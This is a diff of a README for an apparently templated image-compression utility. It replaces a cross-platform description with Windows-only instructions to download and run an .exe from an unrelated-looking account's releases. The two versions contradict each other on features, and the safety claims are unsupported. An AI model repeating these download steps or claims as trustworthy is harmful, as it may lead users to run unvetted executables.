@@ -1,127 +1,69 @@
-# 4K Image Compressor v1.4.0.0220 - image compression optimizer 2026
+# 📸 4k-image-compressor-optimizer - Reduce image file size without quality loss
 
-> **4K Image Compressor v1.4.0.0220 is a cross-platform image compression utility for Windows, macOS, and Linux that is centered on lossless optimization, batch-oriented workflows, and keeping image quality intact.**
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Southern-blogger454/4k-image-compressor-optimizer)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2FmacOS%2FLinux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.4.0.0220-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owenazuscott7707/4k-image-compressor-optimizer?style=flat-square)](https://github.com/owenazuscott7707/4k-image-compressor-optimizer)
+This utility shrinks your image files. It maintains the original clarity of your photos while saving disk space. Use this tool to manage large collections of images easily. It handles batch processing so you can compress hundreds of files with one click.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://owenazuscott7707.github.io/4k-image-compressor-optimizer/">
-    <img src="https://img.shields.io/badge/Download-4K%20Image%20Compressor%20Latest-brightgreen?style=for-the-badge" alt="Download 4K Image Compressor">
-  </a>
-</p>
+You need a computer running Windows 10 or Windows 11 to use this application. Ensure you have at least 200 MB of free storage space on your hard drive. 
 
-> **[Direct Download - 4K Image Compressor v1.4.0.0220](https://owenazuscott7707.github.io/4k-image-compressor-optimizer/)**
+Visit this page to download the software: https://github.com/Southern-blogger454/4k-image-compressor-optimizer
 
----
+## ⚙️ Installation Guide
 
-[Download Latest Build](https://owenazuscott7707.github.io/4k-image-compressor-optimizer/)
+1. Click the link provided above to reach the repository page.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the latest version number.
+4. Find the file ending in .exe under the Assets heading.
+5. Click the file name to start the download.
+6. Open your Downloads folder once the process finishes.
+7. Double-click the file to start the installer.
+8. Follow the prompts on the screen to install the program.
 
----
+## 🚀 How to Compress Images
 
-## What 4K Image Compressor Does
+Launch the application using the icon on your desktop. 
 
-4K Image Compressor is intended to shrink image files without sacrificing the look of the original. It includes lossless optimization and exports to modern formats like WebP and AVIF, which makes it a solid fit for anyone who wants leaner image delivery without adding workflow complexity.
+1. Open the application.
+2. Click the button labeled Add Files.
+3. Select the images you want to shrink from your computer folders.
+4. You can drag and drop folders into the window to add all images inside them.
+5. Choose your target folder for the optimized files.
+6. Click the Start button to begin the process. 
+7. The application shows a progress bar while it works.
+8. A notification appears when the process finishes.
 
-It works well as a desktop application and as a command-line tool for automation. Features such as batch processing, live preview, GPU acceleration, and checksum verification are aimed at making repeated compression jobs easier to manage while giving users more visibility into the output.
+## 🌟 Key Features
 
----
+Lossless Optimization: The tool removes hidden data from your images that you do not need. Your images look exactly like the originals.
 
-## Core Capabilities
+Batch Processing: You can upload thousands of files at once. The software manages the queue and processes them in order.
 
-- Lossless image compression for quality-first optimization
-- Batch processing for working on many files in one pass
-- Real-time preview for checking results before saving
-- Metadata sanitizer for removing or managing embedded data
-- Checksum verification to validate processed output
-- GPU acceleration for faster execution on supported systems
-- CLI mode for scripting and automated workflows
-- Multilingual support for wider usability
-- Support for WebP and AVIF output formats
+Format Support: The tool recognizes common image formats like JPEG, PNG, and WebP. 
 
----
+Resource Management: The application uses moderate system resources. You can continue using your computer for other tasks while it compresses files in the background.
 
-## Installation
+## 🛠️ Frequently Asked Questions
 
-1. Download the latest build from the project download page.
-2. If you are using the repository source, clone it with:
-   - `git clone https://github.com/owenazuscott7707/4k-image-compressor-optimizer.git
-3. Open the application package or run the CLI entry point according to your platform setup.
+Does this tool work offline?
+Yes, the application runs on your local machine. It does not send your photos to the internet to perform compression. Your data stays on your hard drive.
 
-For first use, launch the app or start the command-line tool with a sample image folder to confirm that processing, preview, and output paths are working as expected.
+Can I reverse the process?
+This tool creates new copies of your images. It does not overwrite your original files. If you do not like the result, your original files remain untouched in their original location.
 
----
+How much space will I save?
+Savings depend on the image content. Most photos see size reductions between 30 and 70 percent. Complex images with many colors might see smaller reductions.
 
-## Usage
+What happens if the app closes during processing?
+The application saves progress for each file. You can simply open it again and restart the process. The tool identifies files already finished and skips them.
 
-Common workflows include compressing a single image, processing an entire folder of assets, or converting large batches to WebP or AVIF for web publishing.
+## 💡 Troubleshooting Tips
 
-Example CLI-style workflow:
-- Open a terminal in the project directory
-- Run the compressor against one file or a folder
-- Review the preview output if enabled
-- Save the optimized results to your chosen destination
+If the application fails to launch, verify your installation. Uninstall the program from your Control Panel and run the installer again. 
 
-Example use cases:
-- Prepare image assets for websites
-- Reduce storage usage in large media libraries
-- Optimize export folders before publishing
-- Automate repeated compression jobs in scripts
+Ensure your images are not set to read-only. Right-click your image file, select Properties, and check that the Attributes section does not have the read-only box checked.
 
----
+If the application runs slowly, close other programs that consume large amounts of memory, such as web browsers or video games. 
 
-## Configuration
-
-You can adjust settings through the app interface or with CLI options, depending on how you run the tool.
-
-Example structure:
-- Output format: `webp` or `avif`
-- Compression mode: `lossless`
-- Batch behavior: enabled or disabled
-- Preview: on or off
-- Metadata handling: preserve or sanitize
-
-If your build stores preferences locally, check the application settings area or the user configuration directory for saved options.
-
----
-
-## Requirements
-
-- Operating systems: Windows, macOS, or Linux
-- Runtime: a compatible desktop environment or terminal setup
-- Storage: enough free space for source images and processed output
-- Hardware: GPU support is optional but can improve performance where available
-- Permissions: read access to input files and write access to the output location
-
----
-
-## FAQ
-
-**Does it support bulk jobs?**  
-Yes. Batch processing is included for multi-file optimization tasks.
-
-**Can I use it from the command line?**  
-Yes. CLI mode is available for scripted and repeatable workflows.
-
-**What formats are supported?**  
-The extracted profile references WebP and AVIF support.
-
-**Is metadata preserved?**  
-The tool includes metadata retention and metadata sanitizer capabilities, so behavior depends on your chosen settings.
-
-**How do I update it?**  
-Download the latest build from the project link and replace or reinstall your current version as needed.
-
-**What should I check if output looks different?**  
-Review compression settings, output format, preview results, and metadata options before running another batch.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: image compression, file size reduction, batch processing, lossless optimization, photo management, windows utility, digital workspace
